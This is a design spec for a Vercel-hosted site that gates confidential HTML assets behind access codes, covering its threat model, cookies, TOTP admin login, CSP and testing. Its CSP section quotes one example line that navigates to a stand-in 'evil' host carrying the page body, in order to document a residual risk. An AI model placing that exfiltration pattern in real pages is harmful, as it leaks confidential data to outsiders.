# Gated Asset Sharing Site — Design Spec

**Date:** 2026-07-01
**Status:** Approved design, pending implementation plan
**Repo:** github.com/oren-datanation/share-site

## 1. Purpose

A single-admin website for publishing self-contained interactive HTML "assets" (client
reports, dashboards, etc.) gated behind access codes. Content is confidential and shared
to select external recipients. Publishing is git-native: the admin adds an HTML file,
commits, opens a PR to `main`, and Vercel deploys. Access codes are managed at runtime
through a web admin panel (not git).

"Assets" is the chosen term — the content is not always reports.

## 2. Core decisions (from brainstorming)

- **Code management:** web admin panel backed by a database (not a git-committed file).
- **Code ↔ asset:** one code unlocks one asset; an asset can have many codes (per-recipient),
  so codes can be expired/revoked individually.
- **Recipient access:** shareable link with the code embedded (`/a/<slug>?code=XXX`), one click,
  no typing.
- **Admin auth:** master password **plus** TOTP 2FA.
- **Expiration:** optional to set; default **90 days** if unset; overridable per code
  (absolute date or duration); **instant revoke** always available.
- **Reuse:** codes are reusable until they expire or are revoked.
- **Asset content:** fully self-contained single HTML files to start; storage layout keeps
  the door open for sidecar assets (option B) later.

## 3. Threat model & accepted residual risk

- The **access code is the entire security boundary.** All mechanisms below exist to protect it.
- **Accepted tradeoff (D1):** because links are reusable and shared as URLs, whoever holds the
  original link+code can view the asset until it expires or is revoked. This is the cost of the
  one-click convenience model. Response to a leaked link is **revoke + reissue**. The design
  minimizes *incidental* leakage (address bar, logs, Referer, script exfiltration) but does not
  attempt device-locking or one-time-view semantics (explicitly declined).
- **Confidentiality of client identity (D2):** public slugs are **opaque, fixed-length** tokens
  (e.g. `/a/A7fK9dZ2qR3sT1uV5wXyB0`) so URLs don't reveal who the clients are. Friendly labels
  live only in the admin panel. See §7 for how opacity is generated and enforced.
- **Enumeration resistance = entropy, not response parity.** A successful redemption returns a
  `302` and a failure returns a `200` — these are inherently distinguishable at the network layer,
  so response indistinguishability is *not* the anti-enumeration defense. The defense is the
  **128-bit CSPRNG code** (and fixed-length opaque slug): a valid `(slug, code)` pair cannot be
  found by guessing. Response byte-parity is kept only for the **failure-vs-failure** case
  (unknown slug vs wrong code look identical) so a prober can't distinguish "no such asset" from
  "asset exists, bad code." Rate limiting is defense-in-depth.
- **CSP residual (accepted).** The `'self'` CSP (§9) blocks *background* exfiltration
  (fetch/XHR/beacon/img/websocket) but **cannot** block top-level-navigation exfiltration of the
  asset body (no CSP directive governs `window.location` assignment). Because assets are authored
  by the trusted admin, this residual is accepted; a sandboxed-iframe render would close it and is
  noted as future hardening (§14), not built now.
- **Availability tradeoff — fail closed on DB error.** Every asset load re-checks the code in the
  DB (§6) to keep revocation instant; if the DB is unavailable the load is **denied** (correctness
  over availability, appropriate for confidential content). Blast radius is bounded by using
  Neon's serverless HTTP driver + short query timeouts (§6/§10).

## 4. Stack

- **Next.js (App Router) + TypeScript**, deployed on Vercel.
- **Vercel Postgres (Neon) + Drizzle ORM** — schema and migrations versioned in git.
- One app: gate route, admin UI, auth, DB access.

## 5. Data model

### `assets` (optional, derived from manifest — see §7)
Assets are defined by files in the repo; the DB does not own them. The runtime source of truth
for "which assets exist" is the build-generated manifest. The admin panel reads the manifest.

### `codes` table

| column | notes |
|---|---|
| `id` | uuid primary key (the "code-id" referenced by the asset cookie) |
| `code` | access code: `crypto.randomBytes(16)` → base64url (**128-bit, CSPRNG**), unique, indexed |
| `asset_slug` | opaque slug of the asset this code unlocks |
| `label` | admin-only recipient note, e.g. "Acme Corp – CFO" |
| `created_at` | timestamp |
| `expires_at` | defaults to `created_at + 90 days`; overridable |
| `revoked_at` | nullable; set on revoke |
| `last_used_at` | set on each redemption |
| `use_count` | incremented on each redemption |

**Validity predicate:** a code is valid iff it exists AND `revoked_at IS NULL` AND
`expires_at > now()`. Lookups are by indexed `code` and by `id`.

**`use_count` semantics:** it counts **redemptions** (a `?code=` link exchange), not distinct
viewers or page views. Because the asset cookie has a 24h TTL (§6), the same recipient re-redeems
periodically and increments the count. The admin UI must label it "redemptions," not "views," so
it isn't over-trusted. (§14 declines a fuller audit log as YAGNI.)

### Supporting tables (shared serverless state)

Serverless has no shared in-memory state, so the following live in Postgres (single datastore —
see §9; Vercel KV is a viable alternative if `/a/*` rate-limit volume ever grows):

| table | purpose |
|---|---|
| `totp_used_steps` | `step BIGINT PRIMARY KEY, used_at`. A consumed TOTP time-step is inserted on successful login; a unique-violation on insert = **replay → reject** (§8). Rows older than the acceptance window are pruned lazily. |
| `rate_limits` | `key TEXT PRIMARY KEY, count INT, window_start TIMESTAMP`. Backs the per-slug/global and login rate limiters (§9); pruned lazily on read. |

## 6. Access flow (gate + redemption)

Redemption-redirect model — keeps the code out of the URL bar and out of JavaScript's reach:

1. Recipient opens `/a/<slug>?code=XXX`.
2. **Redemption precedence:** if `?code=` is present, the server **always** validates it and
   re-issues a fresh cookie, ignoring any existing cookie. (This makes a re-clicked link
   authoritative even after a cookie-secret rotation.) The code check: exists, not revoked, not
   expired, `asset_slug` matches `<slug>`.
3. **On failure:** a single generic "This link is invalid or has expired" page. This page is
   **byte-identical** (same `200` body/headers) whether the slug is unknown or the code is wrong,
   so a prober can't distinguish "no such asset" from "asset exists, bad code." Note: this parity
   is only about failure-vs-failure — a *success* returns a `302`, which is inherently
   distinguishable; anti-enumeration rests on 128-bit entropy (§3), not on hiding the 302.
4. **On success (redemption):**
   - Write usage: increment `use_count`, set `last_used_at` (counts redemptions — see §5).
   - Set a signed cookie `asset_access_<slug>`: **HttpOnly, Secure, SameSite=Lax,
     `Path=/a/<slug>`**. Payload binds `{slug, code-id, expiry}` — never the raw code, nothing
     JS-readable. Signed with a dedicated `ASSET_COOKIE_SECRET` (separate from the session secret).
   - **302-redirect to `/a/<slug>`** (code stripped from the URL).
   - **`SameSite=Lax` is required** (not Strict): Strict would drop the cookie on the initial
     cross-site link click (from email/chat), breaking the one-click flow. The residual — an
     attacker can *trigger* (but not read, per SOP + `frame-ancestors 'none'`) an asset load in a
     victim's context — is bounded and accepted.
5. On the clean `/a/<slug>` load with **no `?code=`**: verify the cookie signature (and that its
   `{slug}` matches the path). If the signature is invalid/absent → generic failure page (no
   `?code=` to fall back to). If valid → do a **cheap indexed DB lookup on `code-id`** to confirm
   the code is still valid (not revoked/expired). This is what makes **revocation effectively
   instant** — it takes effect on the next load. Usage is **not** re-written on these loads.
   - **Fail closed on DB error (§3):** if the lookup errors/times out, the load is **denied**
     (generic page), not served from the cookie alone. Use Neon's serverless HTTP driver
     (`@neondatabase/serverless`) with a short timeout so a blip fails fast rather than hanging.
6. The asset HTML is read from disk (§7) and returned with the headers in §9.

**Cookie TTL: 24 hours** (and never beyond the code's `expires_at`). After it lapses, re-opening
the original link re-redeems (per step 2). The per-load DB check (step 5) already gives instant
revocation regardless of TTL; the 24h bound exists only to cap a stolen-cookie window on a device
that can't reach the original link. Because re-redemption re-runs step 4, `use_count` reflects
redemptions, not distinct viewers (§5).

## 7. Asset storage, manifest & serving

- Assets stored as **`assets/<slug>/index.html`** (folder-per-asset). `<slug>` is an **opaque,
  fixed-length token**: exactly **22 base64url chars** = `crypto.randomBytes(16)` (128-bit), so
  no slug can be a path-prefix of another (closes the cookie-`Path` prefix-collision class, §6).
  The friendly title lives in the HTML `<title>` and/or the admin label.
- **How the slug is created (resolving the git-native flow):** publishing is hand-authored, so
  the admin does **not** invent folder names. A helper — `npm run new-asset` — mints the token,
  scaffolds `assets/<token>/index.html`, and prints the slug. The admin then edits that file,
  commits, and PRs. (This is the piece that makes opacity/uniqueness a *generated* property rather
  than human discipline.)
- **Build step** scans `assets/*/`, and for each:
  - extracts `<title>` (falls back to the slug if missing),
  - **fails the build loudly** on: a duplicate slug, or a slug not matching `^[A-Za-z0-9_-]{22}$`
    (this catches a hand-typed human-readable folder name — the D2 backstop),
  - **rejects assets that reference external origins** (enforcing "self-contained"; also required
    for the CSP in §9),
  - writes `assets/manifest.json` (slug → title). The manifest is generated at build time and
    bundled; the admin dropdown and code-validation read it.
- **Residual (honest):** a human *could* still hand-create a 22-char folder that happens to be
  readable; the pattern check enforces shape, not entropy. In practice slugs come from the
  generator, so this is a documented, low-risk manual responsibility.
- **Serving:** the gate route reads `assets/<slug>/index.html` and returns it only after the
  checks in §6. Files are **never** in `/public`; the serverless function is the only door.
- **Bundling (must be verified early — see §12 spike):** ensure `assets/**` is traced into the
  deployed lambda via `outputFileTracingIncludes` (e.g. `'app/a/[slug]/**': ['./assets/**']`)
  with runtime path resolved from `process.cwd()`, **or** a build-generated module map that
  imports the HTML as strings. Prefer whichever is proven deterministic on a real Vercel deploy.

## 8. Admin authentication & panel

- **`/admin/login`:** master password + 6-digit TOTP.
- **Password:** stored as a hash in env var `ADMIN_PASSWORD_HASH`; verified with constant-time
  compare. Rotate by changing the env var.
- **TOTP:** secret in `ADMIN_TOTP_SECRET`; a one-time local setup script prints a QR code to scan.
  Verification uses a **±1-step window** (clock-skew tolerance). **Replay rejection** is backed by
  the `totp_used_steps` table (§5): on success the consumed time-step is inserted; a
  unique-violation means that step was already used → reject. This is the shared-state store the
  control requires (an env-var secret alone cannot track used steps).
- **Recovery:** losing the authenticator is recovered by rotating `ADMIN_TOTP_SECRET` in the
  Vercel dashboard. **Note:** anyone with Vercel project access can read/rotate these env vars and
  thus mint codes — lock down Vercel team access accordingly.
- **Production-only:** all `/admin/*` routes are gated on `VERCEL_ENV === 'production'` and return
  the generic page otherwise. This prevents an admin who lands on a *preview* deployment (which
  has its own throwaway Neon DB, §10) from minting codes into a database that silently won't work
  in production. Codes are only ever generated against the production `/admin`.
- **Session:** on success, a signed **HttpOnly, Secure, SameSite=Strict** session cookie,
  **7-day** expiry, signed with `SESSION_SECRET`. Middleware guards all `/admin/*` routes except
  the login page.
- **CSRF:** all admin state-changing actions are **POST-only** with an **Origin / `Sec-Fetch-Site`
  check** (SameSite=Strict is defense-in-depth, not the sole CSRF control).
- **Rate limiting** on the login endpoint (shared store — see §9).
- **Panel features:** list assets (from manifest); per asset, list its codes with status
  (active / expired / revoked, `last_used_at`, `use_count`); generate a code (choose asset, set
  label, optional expiry → default 90 days); copy the shareable link; revoke a code. **Flag
  orphaned codes** whose `asset_slug` is no longer in the manifest (asset renamed/deleted).

## 9. Security headers & crawler defense

- **`robots.txt`:** `User-agent: *` / `Disallow: /`.
- **`X-Robots-Tag: noindex, nofollow, noarchive`** on every response.
- **`Referrer-Policy: no-referrer`** — so a `?code=` (present only on the pre-redirect request)
  never leaks via `Referer`.
- **Content-Security-Policy on asset responses** (feasible because assets are self-contained):
  `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
  connect-src 'self'; img-src 'self' data:; form-action 'self'; frame-ancestors 'none';
  base-uri 'none'`. Inline scripts still run (interactivity preserved). **What this does and
  doesn't buy (accurate framing):** it blocks *background* exfiltration channels — fetch/XHR,
  `sendBeacon`, `<img>`/`<a ping>`, WebSocket — to any non-`'self'` origin, and the HttpOnly
  cookie + code-stripping redirect mean scripts can't read the code/cookie anyway. It does **not**
  block top-level-navigation exfiltration of the asset body (`window.location = 'https://evil/#'
  + document body`) — no CSP directive governs that. Accepted residual because the asset author is
  the trusted admin (§3, §14). The build-time external-origin check (§7) keeps assets compatible
  with the policy and future-proofs it for same-origin sidecar assets.
- **Codes are 128-bit CSPRNG** (§5) — entropy is the primary anti-brute-force and anti-enumeration
  defense (§3).
- **Rate limiting** on `/a/*` and `/admin/login` backed by the `rate_limits` Postgres table (§5),
  keyed **per-slug and globally**, not per-IP alone (per-IP is defeated by IP rotation and
  punishes shared-NAT recipients). **Single shared store:** rate limiting and TOTP replay state
  both live in Postgres so there's one datastore, one set of creds, and it works across preview
  Neon branches. Vercel KV (native TTL) is a documented alternative if `/a/*` rate-limit write
  volume ever outgrows Postgres. This is defense-in-depth, not load-bearing.
- **`/`** is deliberately neutral/blank — no asset listing, nothing to enumerate.

## 10. Secrets & environments

Env vars (Vercel dashboard, never in repo):
`ADMIN_PASSWORD_HASH`, `ADMIN_TOTP_SECRET`, `SESSION_SECRET`, `ASSET_COOKIE_SECRET`
(separate from `SESSION_SECRET`), and the `POSTGRES_*`/Neon connection vars.

- **Preview vs prod are isolated:** preview deployments use a **separate Neon branch database**
  and **separate secrets** from production. A leaked preview URL is then a throwaway environment,
  not a second door into real data (avoids depending on Vercel's paid Deployment Protection).
- **Rotation impact:** rotating `SESSION_SECRET` invalidates admin sessions; rotating
  `ASSET_COOKIE_SECRET` forces recipients to re-redeem via their link. Both acceptable.

## 11. Git → Vercel pipeline

- **Branches:** `main` (production), `dev` (integration). Vercel production branch = `main`;
  `dev` and PRs get preview deployments.
- **Publishing an asset:** add `assets/<slug>/index.html` → commit → PR into `main` → merge
  triggers the production deploy → then open `/admin` and generate a code. (A code can only be
  generated for an asset after it's deployed and in the manifest — this matches the workflow.)
- **Migrations:** run as a **gated, `main`-only release step** with advisory locking (CI job or
  deploy hook) — **not** on every build/preview/rollback. This prevents a preview build from
  running a destructive migration against prod and avoids concurrent-deploy migration races.
  **Migrations are forward-only**; a deploy rollback is **code-only, never schema** — so a
  panicked rollback can't hit a schema-behind-code mismatch.
- **Admin is production-only** (§8): the `/admin` panel is inert on preview deployments, and codes
  are generated only against the production DB.
- **DB durability:** all access state is in one Neon DB; free-tier PITR is limited. Keep an
  occasional export so a DB loss doesn't permanently lock out all recipients.

## 12. Implementation order (notable)

1. **Bundling spike first:** prove `assets/**` is readable from the deployed lambda on a real
   Vercel deploy (§7) before building anything on top of disk reads. This is a known
   "works locally, 404s in prod" trap.
2. DB schema + Drizzle migrations (`codes`, `totp_used_steps`, `rate_limits`); code
   generation/validation logic; Neon serverless HTTP driver wired with a short query timeout.
3. Gate route with redemption-redirect, cookie (24h TTL, `{slug,code-id,expiry}`), per-load
   revocation check with fail-closed-on-DB-error, redemption precedence.
4. Admin auth (password + TOTP with `totp_used_steps` replay rejection), production-only gate,
   session, CSRF, rate limiting.
5. Admin panel UI (incl. orphaned-code flagging; `use_count` labeled "redemptions").
6. `new-asset` generator + build step (manifest, fixed-length-slug/dup/external-origin checks).
7. Headers, robots.txt, CSP.
8. Preview/prod DB + secret isolation; migration release step.

## 13. Testing & error handling

- **Unit:** code validity (valid / expired / revoked / wrong-slug); 90-day default expiry;
  128-bit code + 22-char slug generation; asset-cookie sign/verify + payload binding (reject
  cross-asset replay, reject past-expiry, reject after secret rotation); TOTP verify (±1 window)
  **and replay rejection via `totp_used_steps`** (second use of the same step is rejected).
- **Integration:** valid code → 302 → clean URL → 200 + HTML; **redemption precedence** (a
  present `?code=` overrides an existing cookie); **failure-vs-failure parity** (unknown slug and
  wrong code return byte-identical 200 body/headers); revoked code denied on next load (instant
  revoke); **DB unavailable during a cookie load → denied** (fail-closed), not served from cookie;
  `/admin/*` redirects to login without a session and is **inert on preview** (`VERCEL_ENV` gate);
  login rejects wrong password **or** wrong TOTP; admin mutation without valid Origin rejected
  (CSRF).
- **Build:** manifest generation; duplicate-slug fails build; slug not matching
  `^[A-Za-z0-9_-]{22}$` fails build; missing `<title>` falls back to slug; external-origin
  reference is caught.
- **Error handling:** a valid code whose asset file is missing still returns the *same* generic
  page (no distinction leaks). Admin shows clear, rate-limited errors for bad credentials.
- **Deploy verification:** the §12 bundling spike is validated on a real deploy, not just
  `vercel dev`.

## 14. Explicitly out of scope (YAGNI)

- User accounts / multi-admin.
- One-time-view or device/IP-locked codes (declined in favor of reusable links).
- Sidecar/multi-file assets **now** (layout and CSP are forward-compatible, but not built yet).
- A separate access-audit log table beyond `last_used_at` / `use_count` (note: `use_count` counts
  redemptions, not distinct viewers — don't over-trust it).
- **Sandboxed-iframe asset rendering** — the structural mitigation for the top-level-navigation
  exfiltration residual (§3/§9). Deferred: assets are authored by the trusted admin, so the
  residual is accepted rather than engineered away now.
